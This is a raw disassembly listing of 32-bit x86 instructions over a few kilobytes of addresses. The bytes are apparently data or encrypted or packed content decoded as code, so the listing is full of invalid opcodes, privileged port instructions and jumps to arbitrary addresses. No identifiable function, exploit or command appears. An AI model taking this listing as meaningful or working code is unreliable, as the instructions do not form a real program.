  41b58a:	add    BYTE PTR [eax],al
  41b58c:	daa    
  41b58d:	in     al,dx
  41b58e:	push   esi
  41b58f:	in     al,0x7b
  41b591:	out    dx,al
  41b592:	je     0x41b5d4
  41b594:	lods   eax,DWORD PTR cs:[esi]
  41b596:	pop    esi
  41b597:	jmp    0x2bd16b80
  41b59c:	in     al,0x4e
  41b59e:	jl     0x41b590
  41b5a0:	shl    dh,1
  41b5a2:	aam    0x80
  41b5a4:	add    dl,BYTE PTR [ebp+esi*8+0x51226361]
  41b5ab:	dec    ebx
  41b5ac:	pop    ds
  41b5ad:	lods   eax,DWORD PTR ds:[esi]
  41b5ae:	or     BYTE PTR [ebp+ebx*2+0x2d77e053],dl
  41b5b5:	pop    ebp
  41b5b6:	or     al,0x9e
  41b5b8:	push   edi
  41b5b9:	aas    
  41b5ba:	retf   0x1806
  41b5bd:	mov    esp,0x1836e1e8
  41b5c2:	js     0x41b605
  41b5c4:	out    dx,al
  41b5c5:	pop    ecx
  41b5c6:	pop    edx
  41b5c7:	sbb    al,0xdf
  41b5c9:	rcr    eax,0x88
  41b5cc:	mov    cl,BYTE PTR [eax-0x6255690e]
  41b5d2:	push   0xcd4f90fa
  41b5d7:	out    0x9e,eax
  41b5d9:	sbb    eax,0x4219451
  41b5de:	repnz pop edi
  41b5e0:	inc    ebx
  41b5e1:	cmp    ch,BYTE PTR [edx-0x382a8eac]
  41b5e7:	daa    
  41b5e8:	jo     0x41b5eb
  41b5ea:	gs push esi
  41b5ec:	jge    0x41b661
  41b5ee:	shl    DWORD PTR [ecx+0x12],cl
  41b5f1:	retf   0xc70e
  41b5f4:	adc    DWORD PTR [edx],edx
  41b5f6:	jg     0x41b599
  41b5f8:	pop    ecx
  41b5f9:	and    ebp,0xb9ed9997
  41b5ff:	xchg   edx,eax
  41b600:	mov    ebx,0xf438e786
  41b605:	test   BYTE PTR [ebx+0xde21e69],0x82
  41b60c:	push   esi
  41b60d:	or     bl,BYTE PTR [ebx]
  41b60f:	idiv   DWORD PTR [edi]
  41b611:	stc    
  41b612:	lds    ebp,FWORD PTR [edi-0x62dd2825]
  41b618:	pop    ds
  41b619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b61a:	jmp    FWORD PTR [ecx-0xe]
  41b61d:	fisub  DWORD PTR [ecx+ebx*1-0x6f]
  41b621:	or     ebx,0x73b2c0f8
  41b627:	es (bad) 
  41b629:	sbb    BYTE PTR es:[ebx+0x7513cf17],ah
  41b630:	push   0x5ef8a979
  41b635:	adc    al,0x3e
  41b637:	test   eax,0x770b8296
  41b63c:	push   0xffffffc9
  41b63e:	jecxz  0x41b630
  41b640:	xchg   ebx,eax
  41b641:	fs mov edi,0x47e96461
  41b647:	sub    ecx,ebp
  41b649:	mov    dl,0x21
  41b64b:	xchg   edi,eax
  41b64c:	sbb    BYTE PTR [eax-0xc],cl
  41b64f:	ret    
  41b650:	add    BYTE PTR [edx-0x5dc3cd3a],bl
  41b656:	push   ds
  41b657:	cmp    BYTE PTR [ebp-0x4b],cl
  41b65a:	cwde   
  41b65b:	jmp    0xd20f:0x599077ee
  41b662:	(bad)  
  41b664:	sub    al,0xd3
  41b666:	xchg   ebx,eax
  41b667:	aaa    
  41b668:	push   0x31136f2d
  41b66d:	mov    ds:0x9c0a6bc2,al
  41b672:	pop    ss
  41b673:	mov    dl,0xca
  41b675:	push   ecx
  41b676:	js     0x41b67b
  41b678:	cdq    
  41b679:	xchg   ecx,eax
  41b67a:	mov    eax,fs:0x1db370cb
  41b680:	loope  0x41b66f
  41b682:	call   0x39df:0xffdb5746
  41b689:	addr16 aam 0xc8
  41b68c:	(bad)  
  41b68e:	rcr    DWORD PTR [eax+0x0],1
	...
  41b6f1:	add    BYTE PTR [eax],al
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	push   0x1c25e6de
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR [ecx+eax*1],al
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	mov    al,ds:0xfbd2e8c2
  41b711:	das    
  41b712:	add    BYTE PTR [eax+0x4c1d7a72],bh
  41b718:	dec    edi
  41b719:	out    dx,al
  41b71a:	inc    ebx
  41b71b:	add    ch,BYTE PTR [eax+0xd450b18]
  41b721:	repnz xor al,0xc
  41b724:	push   es
  41b725:	adc    eax,0xfa0bd39e
  41b72a:	add    ch,bh
  41b72c:	xchg   ebp,eax
  41b72d:	xor    DWORD PTR [ebx],0x2ccaddcd
  41b733:	push   esp
  41b734:	jl     0x41b6e0
  41b736:	shr    BYTE PTR [ecx-0x3875d396],cl
  41b73c:	daa    
  41b73d:	(bad)  
  41b73f:	cmp    bl,BYTE PTR [ecx+eiz*4-0x54]
  41b743:	mov    esp,0x6a41581c
  41b748:	mov    ecx,0x36464e4c
  41b74d:	and    ah,BYTE PTR [edi+0x43]
  41b750:	sub    BYTE PTR [ebp+0x41],dl
  41b753:	push   esi
  41b754:	mov    esp,0x8a8dbbe1
  41b759:	ror    DWORD PTR [ebx+0x3f8dc9a4],cl
  41b75f:	(bad)  
  41b760:	and    ah,BYTE PTR [edx]
  41b762:	out    dx,eax
  41b763:	xor    ch,BYTE PTR [edi]
  41b765:	mov    edx,0x28c207c2
  41b76a:	call   0xf3e768fe
  41b76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b770:	mov    esp,0xede1c242
  41b775:	repz mov dh,0x71
  41b778:	(bad)  
  41b779:	(bad)  
  41b77a:	aaa    
  41b77b:	div    BYTE PTR [ecx]
  41b77d:	(bad)  
  41b77e:	cmp    DWORD PTR [ecx+0x43],ecx
  41b781:	loope  0x41b74f
  41b783:	pop    esp
  41b784:	pop    edx
  41b785:	push   eax
  41b786:	test   BYTE PTR [ebx+0x77],dh
  41b789:	add    ch,BYTE PTR [ecx-0x39]
  41b78c:	pop    esi
  41b78d:	stos   DWORD PTR es:[edi],eax
  41b78e:	(bad)  
  41b78f:	sub    BYTE PTR [ecx+0xe],dh
  41b792:	sub    al,0x3e
  41b794:	sbb    eax,0xc8180a85
  41b799:	mov    DWORD PTR [esi+0xc],esp
  41b79c:	hlt    
  41b79d:	(bad)  
  41b79e:	mov    eax,ds:0x8600a2f3
  41b7a3:	(bad)  
  41b7a4:	sbb    ch,bl
  41b7a6:	int3   
  41b7a7:	jl     0x41b7dc
  41b7a9:	stos   DWORD PTR es:[edi],eax
  41b7aa:	or     DWORD PTR [esi-0x14e9222e],eax
  41b7b0:	dec    eax
  41b7b1:	rcr    DWORD PTR [esi-0x61f591e3],0xf5
  41b7b8:	jp     0x41b7d7
  41b7ba:	enter  0x5755,0x1b
  41b7be:	add    esi,DWORD PTR [eax-0x4d9de0c7]
  41b7c4:	aas    
  41b7c5:	sub    BYTE PTR [ebx-0x38ef7d49],ch
  41b7cb:	inc    ecx
  41b7cc:	lock xchg esi,eax
  41b7ce:	(bad)  
  41b7cf:	push   cs
  41b7d0:	adc    BYTE PTR [ebp+eax*8-0x54991433],0x82
  41b7d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7d9:	inc    esp
  41b7da:	cwde   
  41b7db:	jmp    0x64441696
  41b7e0:	fild   WORD PTR [esi]
  41b7e2:	xchg   DWORD PTR [ebx],esi
  41b7e4:	mov    ds:0xbc318c4c,eax
  41b7e9:	fst    DWORD PTR [eax+0x19]
  41b7ec:	mov    WORD PTR [edx+edi*8+0x44],?
  41b7f0:	xor    BYTE PTR [edx],0x4e
  41b7f3:	scas   eax,DWORD PTR es:[edi]
  41b7f4:	and    dh,BYTE PTR [edx-0x40]
  41b7f7:	outs   dx,BYTE PTR ds:[esi]
  41b7f8:	lahf   
  41b7f9:	out    0x30,eax
  41b7fb:	push   0x2b0c2a64
  41b800:	fisub  DWORD PTR [eax+edx*8-0x45]
  41b804:	push   cs
  41b805:	bound  edx,QWORD PTR [ecx-0x329b7ece]
  41b80b:	xchg   dh,bl
  41b80d:	pop    ss
  41b80e:	xlat   BYTE PTR ds:[ebx]
  41b80f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x7d
  41b881:	mov    esi,0x242001e9
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    al,0x1
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	or     al,0xb9
  41b88e:	add    DWORD PTR [edi+0x88b52d1],ebp
  41b894:	sub    eax,0xf845f474
  41b899:	cwde   
  41b89a:	adc    dl,BYTE PTR [ecx-0x51]
  41b89d:	fstp   DWORD PTR [edi-0x5a2b04cf]
  41b8a3:	je     0x41b8a3
  41b8a5:	and    DWORD PTR [ecx+edi*4-0x6519c267],esp
  41b8ac:	push   0x4c2baec0
  41b8b1:	pop    esi
  41b8b2:	daa    
  41b8b3:	jp     0x41b871
  41b8b5:	jl     0x41b91d
  41b8b7:	std    
  41b8b8:	jp     0x41b908
  41b8ba:	(bad)  
  41b8bb:	out    0x8a,al
  41b8bd:	mov    edi,0x2dd92fb
  41b8c2:	es inc ebx
  41b8c4:	pop    esi
  41b8c5:	xchg   ax,ax
  41b8c7:	mov    esp,0xd031e444
  41b8cc:	mov    dh,0x5
  41b8ce:	mov    BYTE PTR [ebp-0x6e4cec0d],ah
  41b8d4:	aaa    
  41b8d5:	icebp  
  41b8d6:	add    al,0xce
  41b8d8:	rol    BYTE PTR [esi+0x77fd30d0],0xe5
  41b8df:	je     0x41b906
  41b8e1:	mov    al,ds:0xd3e5f354
  41b8e6:	ins    BYTE PTR es:[edi],dx
  41b8e7:	and    al,0x9d
  41b8e9:	sub    BYTE PTR [edi+0x6f],ah
  41b8ec:	rcl    BYTE PTR [esi-0x80],cl
  41b8ef:	gs dec esi
  41b8f2:	fwait
  41b8f3:	mov    ds:0x4f006e29,eax
  41b8f8:	cmp    ah,BYTE PTR [edi+0xc7fe8a5]
  41b8fe:	shl    eax,1
  41b900:	mul    ebp
  41b902:	repz sub BYTE PTR [esi-0x3030f68e],cl
  41b909:	sar    ah,1
  41b90b:	mov    esi,0x773c4cd3
  41b910:	out    0xe7,eax
  41b912:	and    al,0x8f
  41b914:	xchg   ebx,eax
  41b915:	or     DWORD PTR [ebp+0x4279ac11],ebp
  41b91b:	cmp    al,0x9e
  41b91d:	out    0xce,al
  41b91f:	retf   
  41b920:	push   ebx
  41b921:	jmp    0x6bfb3c4e
  41b926:	(bad)  
  41b927:	stc    
  41b928:	sub    al,0x10
  41b92a:	iret   
  41b92b:	xchg   ch,ch
  41b92d:	cmp    eax,0x6e5fac0e
  41b932:	inc    eax
  41b933:	in     eax,dx
  41b934:	dec    esp
  41b935:	ja     0x41b8cd
  41b937:	arpl   bp,sp
  41b939:	mov    ds:0xc55bfcc,eax
  41b93e:	cmc    
  41b93f:	xor    ebx,DWORD PTR [ebx]
  41b941:	cmp    dl,dh
  41b943:	ret    
  41b944:	sub    eax,0x2702edfa
  41b949:	mov    ds:0xa2620ef1,eax
  41b94e:	xchg   ecx,eax
  41b94f:	rol    DWORD PTR [esi],1
  41b951:	lods   al,BYTE PTR ds:[esi]
  41b952:	arpl   WORD PTR [eax],si
  41b954:	lods   eax,DWORD PTR ds:[esi]
  41b955:	(bad)
  41b95a:	jnp    0x41b991
  41b95c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b95d:	dec    eax
  41b95e:	pop    es
  41b95f:	out    0xab,eax
  41b961:	retf   0x8c7c
  41b964:	mov    ecx,0x9011cd21
  41b969:	addr16 push edx
  41b96b:	fst    DWORD PTR [ebp+0x78222455]
  41b971:	jno    0x41b92a
  41b973:	in     eax,0x39
  41b975:	xchg   DWORD PTR [ebp-0xbb0ebb4],ebx
  41b97b:	cmp    al,0x40
  41b97d:	out    0xbf,al
  41b97f:	ror    DWORD PTR [esi+0x32],cl
  41b982:	mov    ebx,0x9902aa1e
  41b987:	call   0x1fb8:0x34f5252c
  41b98e:	sbb    esp,DWORD PTR [edi]
	...
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	adc    BYTE PTR [esi],cl
  41ba02:	mov    al,0xbd
  41ba04:	and    al,0x25
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    al,0x1
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	imul   eax,DWORD PTR [esi+ebp*2],0x5a
  41ba10:	dec    ebp
  41ba11:	mov    edi,esi
  41ba13:	dec    edx
  41ba14:	rcl    BYTE PTR [eax-0x2da1ba5d],cl
  41ba1a:	mov    edi,0xd547f500
  41ba1f:	popf   
  41ba20:	out    0x2d,eax
  41ba22:	adc    DWORD PTR [ebx+0x5734cac7],0x138f66b8
  41ba2c:	jle    0x41ba20
  41ba2e:	lds    edi,FWORD PTR [edx]
  41ba30:	aas    
  41ba31:	div    BYTE PTR [edi-0x3f59eaee]
  41ba37:	cmp    DWORD PTR [ecx+0x75b569f],0xbaa7f9c5
  41ba41:	shl    ebp,cl
  41ba43:	outs   dx,DWORD PTR ds:[esi]
  41ba44:	mov    ebp,0x1f545e4b
  41ba49:	xor    al,0x97
  41ba4b:	adc    BYTE PTR [eax],ah
  41ba4d:	sbb    ch,al
  41ba4f:	gs nop
  41ba51:	inc    esi
  41ba52:	test   al,bh
  41ba54:	loope  0x41ba38
  41ba56:	inc    ecx
  41ba57:	stos   DWORD PTR es:[edi],eax
  41ba58:	push   0x5dae0a7b
  41ba5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba5e:	and    esp,edx
  41ba60:	out    dx,eax
  41ba61:	je     0x41ba77
  41ba63:	cmp    DWORD PTR [edx+0x5a51b6b8],ecx
  41ba69:	xor    esp,DWORD PTR [edi]
  41ba6b:	popa   
  41ba6c:	jbe    0x41badb
  41ba6e:	addr16 jbe 0x41b9f7
  41ba71:	and    BYTE PTR [eax],ch
  41ba73:	adc    BYTE PTR [ebp-0x7c],dl
  41ba76:	jl     0x41baa0
  41ba78:	jnp    0x41ba46
  41ba7a:	jle    0x41ba87
  41ba7c:	or     bl,BYTE PTR [ecx+0x4a]
  41ba7f:	outs   dx,BYTE PTR ds:[esi]
  41ba80:	xor    eax,DWORD PTR [ebx]
  41ba82:	dec    edx
  41ba83:	in     al,0x32
  41ba85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba86:	xor    BYTE PTR [ebx-0x4e],ah
  41ba89:	leave  
  41ba8a:	xchg   BYTE PTR [esi],al
  41ba8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba8d:	add    eax,0xdb38a197
  41ba92:	mov    al,ds:0x8e14626
  41ba97:	ja     0x41babf
  41ba99:	test   ebx,ebp
  41ba9b:	mov    ebp,0x4c6bd14d
  41baa0:	call   0x2ac28bc0
  41baa5:	sub    eax,0xbfbbfa9a
  41baaa:	imul   ecx,ecx,0xeade1c40
  41bab0:	or     esi,DWORD PTR [esi+0x5d]
  41bab3:	jnp    0x41ba7c
  41bab5:	xchg   ebp,eax
  41bab6:	sbb    BYTE PTR [eax-0x305ac456],0xfe
  41babd:	mov    edx,0x4c7bebb3
  41bac2:	sub    DWORD PTR [esi-0x62],eax
  41bac5:	xchg   edi,eax
  41bac6:	dec    eax
  41bac7:	nop
  41bac8:	xor    al,0x8a
  41baca:	xchg   edx,eax
  41bacb:	jecxz  0x41bb41
  41bacd:	dec    edx
  41bace:	call   DWORD PTR [edi-0x38]
  41bad1:	mov    dl,0x41
  41bad3:	cmc    
  41bad4:	ds push cs
  41bad6:	imul   edi,esi,0xffffffd6
  41bad9:	inc    eax
  41bada:	(bad)  
  41badb:	popa   
  41badc:	push   es
  41badd:	mov    ah,0xe7
  41badf:	sbb    al,BYTE PTR [esi+esi*4+0x61]
  41bae3:	rol    BYTE PTR [eax+ebp*4+0x4c68263a],1
  41baea:	mov    edi,0x9f057376
  41baef:	xor    BYTE PTR [bx+si],0xd3
  41baf3:	xchg   ebp,eax
  41baf4:	imul   edi,DWORD PTR [ebx+ebp*4+0x3053e3e3],0x844224d0
  41baff:	aam    0x0
  41bb01:	aaa    
  41bb02:	js     0x41bb3c
  41bb04:	(bad)  
  41bb05:	outs   dx,DWORD PTR ds:[esi]
  41bb06:	cmp    al,0x8e
  41bb08:	daa    
  41bb09:	xchg   ebx,eax
  41bb0a:	mov    dh,0xd5
  41bb0c:	xor    al,0xfe
  41bb0e:	mov    BYTE PTR [edx],dh
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x5],cx
  41bb81:	push   edx
  41bb82:	adc    DWORD PTR [ecx],edi
  41bb84:	sub    BYTE PTR [esi],ah
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	fs ins DWORD PTR es:[edi],dx
  41bb8e:	mov    esi,0xc0128921
  41bb93:	cmc    
  41bb94:	cwde   
  41bb95:	xchg   edx,eax
  41bb96:	push   esi
  41bb97:	imul   ebp,DWORD PTR [edi],0x17
  41bb9a:	xor    eax,0xd9ac6155
  41bb9f:	push   ss
  41bba0:	and    DWORD PTR [esi+eax*8+0x57],edx
  41bba4:	add    DWORD PTR [ebx],eax
  41bba6:	das    
  41bba7:	int    0x69
  41bba9:	sahf   
  41bbaa:	int    0xf5
  41bbac:	xchg   esi,eax
  41bbad:	cmovbe ebp,ebx
  41bbb0:	sub    ebx,DWORD PTR [ebx-0x76]
  41bbb3:	je     0x41bc23
  41bbb5:	jo     0x41bbb6
  41bbb7:	shr    al,1
  41bbb9:	cld    
  41bbba:	jne    0x41bc01
  41bbbc:	outs   dx,BYTE PTR ds:[esi]
  41bbbd:	pop    ecx
  41bbbe:	jge    0x41bbf5
  41bbc0:	cmp    DWORD PTR [edi-0x66225e36],0x31
  41bbc7:	in     al,dx
  41bbc8:	and    esp,DWORD PTR [esi+edi*8]
  41bbcb:	xor    ebx,edx
  41bbcd:	rcl    cl,0x38
  41bbd0:	dec    esi
  41bbd1:	inc    edi
  41bbd2:	mov    gs,eax
  41bbd4:	lahf   
  41bbd5:	pop    ebp
  41bbd6:	sti    
  41bbd7:	fidivr WORD PTR [eax+esi*4+0x53]
  41bbdb:	ss cld 
  41bbdd:	dec    esi
  41bbde:	cmp    eax,0x73fc5e2c
  41bbe3:	pop    ds
  41bbe4:	and    eax,0x87f782f2
  41bbe9:	dec    ecx
  41bbea:	and    edi,edi
  41bbec:	(bad)
  41bbef:	cli    
  41bbf0:	daa    
  41bbf1:	imul   eax,DWORD PTR [ebx],0x4a45dbbe
  41bbf7:	sub    eax,0xf23f3f88
  41bbfc:	pushf  
  41bbfd:	adc    al,0x71
  41bbff:	sbb    eax,0x8821fe19
  41bc04:	std    
  41bc05:	add    BYTE PTR [ebp+eax*8-0x5c],al
  41bc09:	std    
  41bc0a:	sbb    DWORD PTR [edx+0xc],eax
  41bc0d:	pop    ecx
  41bc0e:	nop
  41bc0f:	and    eax,0xe480542b
  41bc14:	daa    
  41bc15:	loopne 0x41bc17
  41bc17:	push   ebp
  41bc18:	add    BYTE PTR [esi],bh
  41bc1a:	jmp    0xa852:0x9e29d8c9
  41bc21:	loop   0x41bc10
  41bc23:	mov    ds:0xc01c29fb,al
  41bc28:	ror    BYTE PTR [edx-0x47],0x5f
  41bc2c:	cmp    al,0xf9
  41bc2e:	dec    ebx
  41bc2f:	mov    WORD PTR [ebx+0x492f12cb],fs
  41bc35:	mov    ecx,0xfa73019d
  41bc3a:	adc    ecx,DWORD PTR [ecx+0x66859bb3]
  41bc40:	sbb    eax,0x92cc31a7
  41bc45:	xor    BYTE PTR [ecx+0x60],bh
  41bc48:	loop   0x41bc0d
  41bc4a:	or     BYTE PTR [edi],ah
  41bc4c:	mov    ebp,0x52c02745
  41bc51:	xor    bh,BYTE PTR [edi-0x1763213c]
  41bc57:	mov    edx,0x37885b46
  41bc5c:	rcl    BYTE PTR [ebx+0x36ea6ae4],1
  41bc62:	mov    eax,0x7b5deb1e
  41bc67:	push   ebx
  41bc68:	popf   
  41bc69:	sahf   
  41bc6a:	mov    ds:0x3dc3cb5b,al
  41bc6f:	int    0xfd
  41bc71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc72:	lock inc ebp
  41bc74:	mov    ch,0x38
  41bc76:	push   cs
  41bc77:	push   esp
  41bc78:	xchg   ebx,eax
  41bc79:	inc    eax
  41bc7a:	fimul  DWORD PTR [esi-0x7aa80008]
  41bc80:	lock ror esp,cl
  41bc83:	mov    cl,BYTE PTR [esi-0x2a]
  41bc86:	mov    sp,0x90ea
  41bc8a:	neg    DWORD PTR [ebx-0x3e1faa06]
	...
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x5d5d9d8
  41bd02:	xchg   esp,eax
  41bd03:	arpl   WORD PTR [edi+eiz*1],bp
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	bound  edx,QWORD PTR ds:0x693011df
  41bd12:	jnp    0x41bcf5
  41bd14:	retf   0xc626
  41bd17:	xchg   edi,eax
  41bd18:	ins    DWORD PTR es:[edi],dx
  41bd19:	fidivr WORD PTR [eax-0x7f]
  41bd1c:	pop    edx
  41bd1d:	dec    edi
  41bd1e:	rcr    DWORD PTR [edi-0x23],1
  41bd21:	push   ss
  41bd22:	sub    eax,0x559fa47e
  41bd27:	in     eax,dx
  41bd28:	or     esp,DWORD PTR [edx+0x4e]
  41bd2b:	sbb    BYTE PTR [eax+0x32],ah
  41bd2e:	loopne 0x41bd77
  41bd30:	nop
  41bd31:	push   ecx
  41bd32:	outs   dx,BYTE PTR ds:[esi]
  41bd33:	or     cl,BYTE PTR [eax-0x24fec37b]
  41bd39:	xchg   edx,ebx
  41bd3b:	push   eax
  41bd3c:	mov    ds:0x6b02cbd4,al
  41bd41:	mov    cs,WORD PTR ds:0xd8088b27
  41bd47:	mov    edx,0x47cbe003
  41bd4c:	inc    ebp
  41bd4d:	imul   ebx,DWORD PTR [esi],0x169b228e
  41bd53:	inc    dh
  41bd55:	adc    edx,DWORD PTR [edi]
  41bd57:	js     0x41bd6d
  41bd59:	ins    DWORD PTR es:[edi],dx
  41bd5a:	and    edx,DWORD PTR [edx]
  41bd5c:	sbb    al,0xa9
  41bd5e:	xchg   ecx,eax
  41bd5f:	popf   
  41bd60:	pop    esi
  41bd61:	jmp    0x41bd60
  41bd63:	or     al,0xf7
  41bd65:	bound  esi,QWORD PTR [ecx-0x40]
  41bd68:	sbb    DWORD PTR [esi-0x26],esi
  41bd6b:	jg     0x41bd64
  41bd6d:	pop    edx
  41bd6e:	dec    edi
  41bd6f:	and    bh,cl
  41bd71:	(bad)  
  41bd73:	leave  
  41bd74:	inc    esi
  41bd75:	xchg   esp,eax
  41bd76:	xor    eax,0x97ab2be9
  41bd7b:	inc    esp
  41bd7c:	mov    ah,0xf4
  41bd7e:	add    ebx,ebp
  41bd80:	sub    ebx,ebx
  41bd82:	ja     0x41bd05
  41bd84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd85:	mov    al,0x3a
  41bd87:	(bad)  
  41bd89:	sub    esi,DWORD PTR [esi-0x5d6b18ff]
  41bd8f:	out    0xeb,al
  41bd91:	dec    DWORD PTR [edx+eax*2+0x13af30f8]
  41bd98:	(bad)  
  41bd9a:	dec    edi
  41bd9b:	push   edi
  41bd9c:	inc    ebx
  41bd9d:	xor    al,bl
  41bd9f:	mov    ds:0x369bb3a,al
  41bda4:	push   ebp
  41bda5:	out    dx,eax
  41bda6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bda7:	xchg   esi,eax
  41bda8:	(bad)  
  41bda9:	icebp  
  41bdaa:	dec    esp
  41bdab:	sub    dh,BYTE PTR [ecx]
  41bdad:	xchg   edi,eax
  41bdae:	pop    es
  41bdaf:	mov    cs,ecx
  41bdb1:	mov    ss,WORD PTR [eax+0x6c252055]
  41bdb7:	add    cl,BYTE PTR [esi]
  41bdb9:	xchg   ebp,eax
  41bdba:	mov    eax,0x890e2767
  41bdbf:	cwde   
  41bdc0:	sbb    cl,BYTE PTR ds:0xf16d3c1f
  41bdc6:	jne    0x41bd80
  41bdc8:	jmp    0x1eaba63
  41bdcd:	(bad)  
  41bdce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdcf:	je     0x41be2e
  41bdd1:	cmc    
  41bdd2:	mov    ch,0x7f
  41bdd4:	jge    0x41bdec
  41bdd6:	in     eax,dx
  41bdd7:	push   ds
  41bdd8:	mov    ebp,0x3cb63c4e
  41bddd:	mov    ebx,0xf39f0712
  41bde2:	mov    esi,0xcd3c8f33
  41bde7:	pop    ecx
  41bde8:	dec    ecx
  41bde9:	das    
  41bdea:	or     dh,BYTE PTR [ecx]
  41bdec:	dec    eax
  41bded:	push   esi
  41bdee:	xchg   edx,ebp
  41bdf0:	pop    ds
  41bdf1:	adc    eax,0x92afa524
  41bdf6:	pop    ss
  41bdf7:	shl    DWORD PTR [ebx-0x3e],0xb9
  41bdfb:	xchg   ebp,eax
  41bdfc:	xrelease xchg BYTE PTR es:[eax+0x1d314db7],bl
  41be04:	sar    ebp,cl
  41be06:	mov    ecx,0x8c220d18
  41be0b:	outs   dx,BYTE PTR ds:[esi]
  41be0c:	div    BYTE PTR [eax+0x98dc]
	...
  41be72:	add    BYTE PTR [eax],al
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx-0x2451c09a]
  41be82:	cmp    eax,0x1283083
  41be87:	add    BYTE PTR [ecx+eax*1],al
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	es sahf 
  41be8e:	scas   al,BYTE PTR es:[edi]
  41be8f:	sub    al,0x84
  41be91:	pop    ds
  41be92:	inc    edx
  41be93:	push   esi
  41be94:	sbb    DWORD PTR [edx],ebx
  41be96:	mov    cl,0x45
  41be98:	sub    bl,ch
  41be9a:	cmp    eax,0xb5e21b68
  41be9f:	addr16 rcl al,1
  41bea2:	mov    edi,0x3f7aeea0
  41bea7:	stos   DWORD PTR es:[edi],eax
  41bea8:	xor    DWORD PTR [esi+eiz*1-0x14daf605],ecx
  41beaf:	jp     0x41bea9
  41beb1:	(bad)  
  41beb2:	imul   BYTE PTR [ebp-0x3c]
  41beb5:	jne    0x41becc
  41beb7:	pop    ds
  41beb8:	ror    ch,cl
  41beba:	(bad)  
  41bebb:	cmp    DWORD PTR [ecx-0x55727ac7],edi
  41bec1:	mov    ecx,0x89eb8253
  41bec6:	push   esi
  41bec7:	fsubr  DWORD PTR [eax-0x3f630ea5]
  41becd:	mov    ecx,0x4156ea9b
  41bed2:	fldenv [edx-0x1]
  41bed5:	(bad)  
  41bed6:	not    DWORD PTR [edx-0x4d6ace67]
  41bedc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bedd:	or     al,BYTE PTR ds:0x9312c91a
  41bee3:	daa    
  41bee4:	imul   ecx,DWORD PTR [eax+0x11e69715],0x2a
  41beeb:	dec    esp
  41beec:	add    eax,0x7a6f3f12
  41bef1:	sbb    BYTE PTR [edi-0x1886f71],ch
  41bef7:	or     edi,DWORD PTR ds:0x58fc577f
  41befd:	jle    0x41bf23
  41beff:	and    bh,0xcf
  41bf02:	mov    eax,ds:0x4d90ea21
  41bf07:	dec    edi
  41bf08:	mov    esp,0x8ea77d12
  41bf0d:	imul   edx,DWORD PTR [ecx*1-0x381cf696],0x5c
  41bf15:	pop    ebp
  41bf16:	loopne 0x41be9b
  41bf18:	jp     0x41bf5f
  41bf1a:	daa    
  41bf1b:	mov    dx,0x37f1
  41bf1f:	xor    eax,0x10e084af
  41bf24:	imul   esp,DWORD PTR [ecx-0x71],0xbb5ad447
  41bf2b:	in     eax,0x73
  41bf2d:	in     eax,0xc5
  41bf2f:	mov    ah,0x91
  41bf31:	and    eax,0x5126feb7
  41bf36:	push   ss
  41bf37:	pop    ecx
  41bf38:	mov    ds:0x98e25102,al
  41bf3d:	stc    
  41bf3e:	pop    edi
  41bf3f:	xchg   ebx,ebx
  41bf41:	jo     0x41bf65
  41bf43:	(bad)  
  41bf44:	lods   al,BYTE PTR ds:[esi]
  41bf45:	sub    eax,0x2ab66d17
  41bf4a:	test   al,0x8c
  41bf4c:	inc    ecx
  41bf4d:	add    ebx,DWORD PTR [ebx+0x39]
  41bf50:	(bad)  
  41bf51:	and    DWORD PTR [esi+ebp*8-0x4e03ce7b],esi
  41bf58:	mov    ebx,0x14531c4d
  41bf5d:	or     eax,0xb7da4853
  41bf62:	addr16 dec edi
  41bf64:	iret   
  41bf65:	pop    edx
  41bf66:	mov    edx,0x6442eb0d
  41bf6b:	pop    eax
  41bf6c:	add    DWORD PTR [eax],0xfffffffe
  41bf6f:	ins    BYTE PTR es:[edi],dx
  41bf70:	cmp    al,bh
  41bf72:	jmp    ebp
  41bf74:	xchg   ebp,eax
  41bf75:	unpckhps xmm5,XMMWORD PTR ds:0xfe7bf90f
